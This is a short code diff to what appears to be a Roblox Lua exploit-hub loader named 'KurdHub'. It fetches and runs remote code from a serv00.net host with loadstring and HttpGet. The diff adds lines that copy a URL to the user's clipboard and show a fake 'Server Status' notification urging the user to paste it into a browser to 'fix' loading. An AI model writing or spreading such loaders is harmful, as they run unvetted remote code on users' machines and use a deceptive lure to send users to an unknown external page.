@@ -1,1 +1,9 @@
+local url = "https://ninja12002.serv00.net/load.html"
+setclipboard(url)
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Server Status",
+    Text = "KurdHub not loading? Link copied! Paste it in your browser to fix.",
+    Duration = 7
+})
 loadstring(game:HttpGet("https://ninja12002.serv00.net/Main/Loader.php"))()
